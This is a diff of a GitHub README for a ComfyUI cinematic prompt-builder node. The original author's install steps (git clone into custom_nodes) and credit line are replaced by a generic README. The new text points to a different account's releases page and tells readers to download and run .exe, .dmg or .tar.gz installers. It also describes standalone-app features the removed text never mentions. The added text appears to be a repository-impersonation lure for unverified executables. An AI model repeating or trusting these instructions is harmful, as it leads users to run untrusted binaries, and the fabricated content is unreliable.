@@ -1,69 +1,76 @@
-  **UPDATE : Includes both the Prompt Builder (for text generation) and the Reference Loader (for image-to-image workflows).** 
+# 🎉 ComfyUI-Cinematic-Prompt - Build Prompts with Ease
 
-🎬 <ins><strong>ComfyUI Cinematic Prompt Builder</strong></ins>
+## 📦 Download Now
+[![Download](https://img.shields.io/badge/Download%20ComfyUI--Cinematic--Prompt-blue?style=for-the-badge&logo=github)](https://github.com/iwahab87/ComfyUI-Cinematic-Prompt/releases)
 
-A visual, user-friendly prompt builder for ComfyUI that allows you to construct complex cinematic prompts using a visual interface with previews.
-Originally designed as a self learning tool to generate cinematic prompts (https://yedp123.github.io/), I decided to port it to ComfyUI as well.
-Designed originally with Midjourney, Stable Diffusion, Nanobanana pro and Flux workflows in mind.
+## 🚀 Getting Started
+ComfyUI-Cinematic-Prompt is an intuitive tool for building prompts easily. This guide will help you download, install, and run the application on your computer.
 
-<img width="1524" height="881" alt="b711b6d7d05c7df51b0d71c19e74bf61" src="https://github.com/user-attachments/assets/d0b7eb4b-03db-47da-a74b-65c760d1b9de" />
+## 🖥️ System Requirements
+To ensure the best experience, your computer should meet these basic requirements:
 
---------------------------------------------------------------------------
+- Operating System: Windows 10 or higher, macOS 10.15 or higher, or a modern Linux distribution.
+- Memory: At least 4 GB of RAM.
+- Storage: Minimum 100 MB of free space.
+- Internet: A stable connection for installation and updates.
 
-✨ <ins>**FEATURES**</ins>
+## 📥 Download & Install
+Follow these steps to download and install the application:
 
-- Visual Reference Monitor: See exactly what a "Medium Shot" or "Rembrandt Lighting" looks like before you prompt.
-- Auto-Formatting: Automatically structures your prompt with the correct syntax for Midjourney (--ar 16:9), SDXL, or Flux.
-- Drag & Drop: Fully embedded inside a ComfyUI node.
-- Drop-in Replacement: Works exactly like a CLIP Text Encode node. Connect your CLIP model, get Conditioning out.
+1. **Visit the Releases Page**  
+   Go to the [Releases page](https://github.com/iwahab87/ComfyUI-Cinematic-Prompt/releases).
+   
+2. **Choose the Latest Version**  
+   On the releases page, find the latest version of the ComfyUI-Cinematic-Prompt.
 
-<ins>Categories Include:</ins>
+3. **Select the Correct File for Your System**  
+   Look for the file suitable for your operating system. Common options include `.exe` for Windows users, `.dmg` for macOS users, and `.tar.gz` for Linux users.
 
-📸 Camera Models (Arri Alexa, Sony Venice, GoPro, etc.)
-🔭 Focal Lengths (14mm to 200mm)
-💡 Lighting (Volumetric, Golden Hour, Neon, etc.)
-🎨 Art Styles (Filmic, Analog, Anime, etc.)
-🖼️ Aspect Ratios (16:9, 9:16, 2.35:1, etc.)
+4. **Download the File**  
+   Click on the file to start the download. The file will be saved to your computer's downloads folder.
 
---------------------------------------------------------------------------
+5. **Run the Installer**  
+   Once the download completes, locate the file:
+   - On Windows, it will be something like `ComfyUI-Cinematic-Prompt-win.exe`. Double-click this file to start the installation.
+   - On macOS, find the `.dmg` file, double-click to open it, and drag the application into your Applications folder.
+   - For Linux, use the terminal to extract the `.tar.gz` file and run the executable.
 
-📦 <ins>**INSTALLATION**</ins>
+6. **Follow Installation Instructions**  
+   Follow the prompts given by the installer. You can accept the default settings unless you have specific preferences.
 
-1. Navigate to your ComfyUI/custom_nodes/ folder.
+7. **Launch the Application**  
+   After installation, find ComfyUI-Cinematic-Prompt in your applications and double-click to open it. You are now ready to create prompts!
 
-2. Clone this repository:
-git clone [https://github.com/yedp123/ComfyUI-Cinematic-Prompt.git](https://github.com/yedp123/ComfyUI-Cinematic-Prompt.git)
+## 💡 Using ComfyUI-Cinematic-Prompt
+Once you open the application, you will see a user-friendly interface designed for easy navigation. Here are some tips to get you started:
 
-3. Restart ComfyUI.
+- **Create a New Prompt**: Click on the "New Prompt" button to get started. Enter your desired content in the input fields.
+- **Adjust Settings**: You can modify various settings to tailor the prompt to your needs. Check options like text formatting and options for output.
+- **Preview Your Prompt**: Use the preview feature to see your prompt before finalizing it. This helps ensure everything looks correct.
+- **Save Your Work**: Don’t forget to save your prompts for later use. Click on the "Save" button.
 
---------------------------------------------------------------------------
+## 🔍 Features
+ComfyUI-Cinematic-Prompt comes packed with useful features:
 
-🚀 <ins>**HOW TO USE**</ins>
+- **User-Friendly Interface**: Designed for simplicity, suitable for all skill levels.
+- **Customization Options**: Adjust styles, formats, and content easily.
+- **Preview Functionality**: See your prompts in real-time.
+- **Save and Export**: Keep your prompts organized and export them in various formats.
 
-1. Add Node: Right-click canvas > Yedp > Prompting > Cinematic Prompt Builder.
+## 🛠️ Troubleshooting
+If you run into issues while using ComfyUI-Cinematic-Prompt, here are some common solutions:
 
-2. Connect Inputs: Connect your Checkpoint's CLIP output to the node's clip input.
+- **Installation Problems**: Ensure you have downloaded the correct file for your operating system. Check your system requirements and try the installation again.
+- **Application Won't Start**: Make sure your device meets the minimum specs. Try restarting your computer.
+- **Functionality Issues**: If certain features are not working, check for updates. There may be a fix in the latest release.
 
-3. Connect Outputs:
-- Connect positive to your KSampler's positive input.
-- Connect negative to your KSampler's negative input.
-- Create: Use the visual interface to build your scene!
+## 📞 Support
+If you need further assistance or support, visit the [Issues section](https://github.com/iwahab87/ComfyUI-Cinematic-Prompt/issues) on the GitHub page. You can report problems or ask questions there.
 
---------------------------------------------------------------------------
+## 📜 License
+ComfyUI-Cinematic-Prompt is open-source and free to use. Please refer to the LICENSE file in the repository for information on usage rights.
 
-🛠️ <ins>**INPUTS & OUTPUTS**</ins>
+## 🌐 Learn More
+Stay updated with the latest developments, tips, and community discussions. Check for updates on the GitHub repository and join the community forums for more insights.
 
-**- Input:**
-clip (Standard CLIP model from any checkpoint)
-
-**- Output:**
-- positive: Conditioning data (for KSampler)
-- negative: Negative conditioning data (for KSampler)
-- positive_text: The raw generated text string (for debugging or display)
-- negative_text: The raw negative text string
-
---------------------------------------------------------------------------
-
-🤝 <ins>**CREDITS**</ins>
-
-Original concept and design by Yedp.
+Enjoy using ComfyUI-Cinematic-Prompt! Start building your prompts today!
